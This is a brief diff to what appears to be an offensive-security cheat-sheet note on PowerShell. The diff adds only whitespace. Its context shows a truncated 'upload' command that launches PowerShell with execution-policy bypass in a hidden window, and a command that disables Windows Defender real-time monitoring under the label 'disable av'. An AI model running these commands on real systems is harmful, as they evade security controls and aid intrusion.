@@ -9,6 +9,8 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # powershell
 
+
+
 **Command** ([[powershell upload]]):
 
 ```powershell
@@ -17,9 +19,21 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Windo
 
 ```
 
+
+
+
+
+
+
 **Command** ([[powershell disable av]]):
 
 ```bash
 Set-MpPreference -DisableRealtimeMonitoring $true
 
 ```
+
+
+
+
+
+
